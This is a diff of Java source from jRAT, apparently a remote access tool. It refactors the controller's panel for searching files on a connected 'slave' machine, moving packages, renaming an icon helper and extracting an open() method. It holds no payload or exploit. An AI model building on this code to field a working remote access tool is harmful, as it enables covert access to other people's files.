@@ -1,12 +1,12 @@
-package jrat.controller.ui.panels;
+package jrat.module.fs.ui;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.Packet53StartSearch;
-import jrat.controller.packets.outgoing.Packet54StopSearch;
+import jrat.module.fs.packets.Packet53StartSearch;
+import jrat.module.fs.packets.Packet54StopSearch;
 import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.components.TableModel;
-import jrat.controller.ui.frames.FrameRemoteFiles;
+import jrat.controller.ui.panels.PanelControlParent;
 import jrat.controller.ui.renderers.table.FileSearchTableRenderer;
 import jrat.controller.utils.Utils;
 
@@ -46,17 +46,17 @@ public class PanelSearchFiles extends PanelControlParent {
 
 		JButton btnSearch = new JButton("Search");
 
-		btnSearch.setIcon(IconUtils.getIcon("folder-search"));
+		btnSearch.setIcon(Resources.getIcon("folder-search"));
 
 		txt = new JTextField();
 		txt.setColumns(10);
 
 		JToggleButton tglbtnNameContains = new JToggleButton("Name contains");
-		tglbtnNameContains.setIcon(IconUtils.getIcon("file"));
+		tglbtnNameContains.setIcon(Resources.getIcon("file"));
 		buttonGroup.add(tglbtnNameContains);
 
 		final JToggleButton tglbtnPathContains = new JToggleButton("Path contains");
-		tglbtnPathContains.setIcon(IconUtils.getIcon("folder"));
+		tglbtnPathContains.setIcon(Resources.getIcon("folder"));
 		buttonGroup.add(tglbtnPathContains);
 		tglbtnPathContains.setSelected(true);
 
@@ -70,7 +70,7 @@ public class PanelSearchFiles extends PanelControlParent {
 				}
 			}
 		});
-		btnClear.setIcon(IconUtils.getIcon("clear"));
+		btnClear.setIcon(Resources.getIcon("clear"));
 
 		txtSearchRoot = new JTextField(slave.getDrives()[0].getName());
 
@@ -85,7 +85,7 @@ public class PanelSearchFiles extends PanelControlParent {
 		Utils.addPopup(table, popupMenu);
 
 		JMenuItem mntmOpenInFile = new JMenuItem("Open in file manager");
-		mntmOpenInFile.setIcon(IconUtils.getIcon("folder-go"));
+		mntmOpenInFile.setIcon(Resources.getIcon("folder-go"));
 		mntmOpenInFile.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				int row = table.getSelectedRow();
@@ -105,21 +105,10 @@ public class PanelSearchFiles extends PanelControlParent {
 		JButton btnOpenInFile = new JButton("Open");
 		btnOpenInFile.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				int row = table.getSelectedRow();
-				if (row != -1) {
-					FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(sl);
-					if (frame == null) {
-						frame = new FrameRemoteFiles(sl);
-						frame.setVisible(true);
-					}
-					String val = model.getValueAt(row, 0).toString();
-					String path = val.substring(0, val.lastIndexOf(sl.getFileSeparator()));
-					frame.getFilesPanel().getRemoteTable().setDirectory(path);
-
-				}
+				open();
 			}
 		});
-		btnOpenInFile.setIcon(IconUtils.getIcon("folder-go"));
+		btnOpenInFile.setIcon(Resources.getIcon("folder-go"));
 		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(
 			groupLayout.createParallelGroup(Alignment.LEADING)
@@ -184,6 +173,21 @@ public class PanelSearchFiles extends PanelControlParent {
 			}
 		});
 	}
+
+	public void open() {
+        int row = table.getSelectedRow();
+        if (row != -1) {
+            FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
+            if (frame == null) {
+                frame = new FrameRemoteFiles(slave);
+                frame.displayFrame();
+            }
+
+            String val = model.getValueAt(row, 0).toString();
+            String path = val.substring(0, val.lastIndexOf(slave.getFileSeparator()));
+            frame.getFilesPanel().getRemoteTable().setDirectory(path);
+        }
+    }
 
 	/**
 	 * Start file search from this path
